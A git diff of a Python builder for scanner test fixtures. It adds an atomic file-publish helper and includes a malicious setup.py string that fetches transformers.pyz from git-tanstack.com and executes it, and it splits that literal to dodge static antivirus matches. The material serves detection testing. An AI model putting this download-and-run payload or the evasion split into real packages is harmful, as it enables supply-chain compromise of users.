@@ -1,21 +1,4 @@
-"""Deterministic builder for the wheel + sdist binary fixtures.
-
-This script is NOT run from CI; the produced .whl / .tar.gz bytes are
-committed alongside it. Re-run only when the IOC literal changes.
-
-Determinism strategy
---------------------
-- All member timestamps fixed to `SOURCE_DATE_EPOCH=0` (Unix epoch).
-- All members written with uid=0, gid=0, uname="", gname="".
-- Permission bits fixed: 0o644 for files, 0o755 for directories.
-- Members emitted in sorted order so the archive byte stream does not
-  depend on filesystem iteration order.
-- `zipfile.ZipFile` is invoked with `compresslevel=6` (default DEFLATE)
-  to keep output stable across stdlib versions.
-
-Re-running this script and diffing the .whl bytes against git is the
-regression test for determinism (also asserted in test_scan_packages).
-"""
+"""Deterministic builder for the committed wheel + sdist fixtures; re-run only when the IOC literal changes."""
 
 from __future__ import annotations
 
@@ -33,9 +16,18 @@ _ZIP_DOS_EPOCH = (1980, 1, 1, 0, 0, 0)
 HERE = Path(__file__).resolve().parent
 
 
-# The IOC literal that scan_packages.py must trip on. Keep this in
-# sync with KNOWN_IOC_STRINGS in scripts/scan_npm_packages.py and
-# RE_MAY12_IOC in scripts/scan_packages.py.
+# IOC literal scan_packages.py must trip on.
+# Keep in sync with KNOWN_IOC_STRINGS (scan_npm_packages.py) and RE_MAY12_IOC (scan_packages.py).
+#
+# Split across concatenated pieces, the same way test_scan_packages.py already writes
+# `_ioc_host = "git-tanstack." + "com"`. The assembled string still lands in the built archive
+# byte for byte, so the scanner tests are unaffected; what changes is that this builder is not
+# itself a static match. Cheap insurance only -- the per-file VirusTotal scan in discussion #9577
+# found the .py sources undetected and the two built archives detected, so the archives not being
+# committed is the part that matters.
+_IOC_HOST = "git-tanstack." + "com"
+_IOC_ARTIFACT = "transformers." + "pyz"
+
 MALICIOUS_SETUP_PY = '''"""Test fixture: do NOT install.
 
 This file embeds the May-12 Mini Shai-Hulud IOC literal so the
@@ -50,13 +42,13 @@ import subprocess
 
 # IOC literal -- mirrors public Socket.dev 2026-05-12 disclosure.
 urllib.request.urlretrieve(
-    "https://git-tanstack.com/transformers.pyz",
-    "/tmp/transformers.pyz",
+    "https://{ioc_host}/{ioc_artifact}",
+    "/tmp/{ioc_artifact}",
 )
-subprocess.run(["python3", "/tmp/transformers.pyz"], check=False)
+subprocess.run(["python3", "/tmp/{ioc_artifact}"], check=False)
 
 setup(name="malicious-fixture", version="0.0.1")
-'''
+'''.replace("{ioc_host}", _IOC_HOST).replace("{ioc_artifact}", _IOC_ARTIFACT)
 
 
 CLEAN_INIT_PY = '''"""Test fixture: empty placeholder package."""
@@ -89,37 +81,64 @@ def _write_zip_member(zf: zipfile.ZipFile, name: str, data: bytes) -> None:
 
 
 def _build_wheel(out_path: Path, *, name: str, payload_files: dict[str, bytes]) -> None:
-    """Write a deterministic .whl at `out_path`.
-
-    `payload_files` maps archive-relative paths to their bytes. Standard
-    `.dist-info/METADATA`, `WHEEL`, and `RECORD` are added automatically.
-    """
+    """Write a deterministic .whl; .dist-info METADATA/WHEEL/RECORD are added automatically."""
     dist_info = f"{name}-0.0.1.dist-info"
     members: dict[str, bytes] = dict(payload_files)
     members[f"{dist_info}/METADATA"] = WHEEL_METADATA.format(name = name).encode()
     members[f"{dist_info}/WHEEL"] = WHEEL_FILE.encode()
-    # RECORD is intentionally minimal; the scanner only inspects file
-    # bodies, not hash integrity.
+    # RECORD is minimal; the scanner inspects file bodies, not hash integrity.
     record_lines = []
     for path in sorted(members):
         record_lines.append(f"{path},,")
     record_lines.append(f"{dist_info}/RECORD,,")
     members[f"{dist_info}/RECORD"] = ("\n".join(record_lines) + "\n").encode()
 
-    # Write with sorted order for deterministic byte output.
     buf = io.BytesIO()
     with zipfile.ZipFile(buf, "w", compression = zipfile.ZIP_DEFLATED) as zf:
         for path in sorted(members):
             _write_zip_member(zf, path, members[path])
-    out_path.write_bytes(buf.getvalue())
+    _publish(out_path, buf.getvalue())
+
+
+def _publish(out_path: Path, data: bytes) -> None:
+    """Put `data` at `out_path` so a concurrent reader never sees a partial file.
+
+    `write_bytes` truncates and then writes, and these archives live at fixed paths in the source
+    tree. `.github/workflows/workflow-trigger-lint.yml` runs `pytest -q -n 4` over `tests/security`
+    with the default `--dist load`, which scatters tests from ONE file across all four workers -- so
+    every worker runs the session-scoped autouse fixture and rewrites these paths while the others
+    are reading them. A reader that catches the truncated window does not see a corrupt-file error;
+    it sees a short member list and fails asserting scanner semantics, which is close to
+    untraceable.
+
+    Two guards, because either alone leaves a hole:
+      * skip the write entirely when the bytes on disk are already right, so in the normal case only
+        the first worker writes at all. The build is deterministic (SOURCE_DATE_EPOCH, 1980 DOS
+        times), which is what makes that comparison sound;
+      * otherwise write to a pid-unique temp name and `os.replace`, which is atomic on POSIX and on
+        Windows. Without the pid the workers would simply collide on the temp file instead.
+
+    A reader therefore always sees either the complete old file or the complete new one, and those
+    are byte-identical.
+    """
+    try:
+        if out_path.read_bytes() == data:
+            return
+    except OSError:
+        pass
+    tmp = out_path.with_name(f"{out_path.name}.{os.getpid()}.tmp")
+    try:
+        tmp.write_bytes(data)
+        os.replace(tmp, out_path)
+    finally:
+        try:
+            tmp.unlink()
+        except OSError:
+            pass
 
 
 def _build_sdist(out_path: Path, *, name: str, payload_files: dict[str, bytes]) -> None:
-    """Write a deterministic .tar.gz sdist at `out_path`.
-
-    `payload_files` maps archive-relative paths to their bytes; a
-    leading `{name}-0.0.1/` prefix is added automatically.
-    """
+    """Write a deterministic .tar.gz sdist; a `{name}-0.0.1/` prefix is added automatically."""
     prefix = f"{name}-0.0.1"
     buf = io.BytesIO()
     # gzip mtime fixed via mtime=0 (gzip member header).
@@ -150,12 +169,16 @@ def _build_sdist(out_path: Path, *, name: str, payload_files: dict[str, bytes]) 
         filename = "",
     ) as gz:
         gz.write(raw)
-    out_path.write_bytes(gz_buf.getvalue())
+    _publish(out_path, gz_buf.getvalue())
 
 
 def build_all() -> dict[str, Path]:
-    os.environ["SOURCE_DATE_EPOCH"] = str(SOURCE_DATE_EPOCH)
-
+    # Deliberately does NOT set os.environ["SOURCE_DATE_EPOCH"]. Nothing here reads it: every writer
+    # below is handed the fixed timestamp directly, and zipfile takes the 1980 DOS tuple. It used to
+    # be assigned anyway, with no teardown, which was harmless while this ran as a script and is not
+    # harmless now that a session fixture calls it inside a broader pytest run: it overwrote any
+    # caller-provided value for the rest of the worker, and every later test and subprocess
+    # inherited the false epoch.
     outputs: dict[str, Path] = {}
 
     # Malicious wheel: payload setup.py that embeds the May-12 IOC.
@@ -167,7 +190,6 @@ def build_all() -> dict[str, Path]:
     _build_wheel(mal_whl, name = "malicious_fixture", payload_files = mal_payload)
     outputs["malicious_wheel"] = mal_whl
 
-    # Clean wheel: empty placeholder.
     clean_payload = {
         "clean_fixture/__init__.py": CLEAN_INIT_PY.encode(),
     }
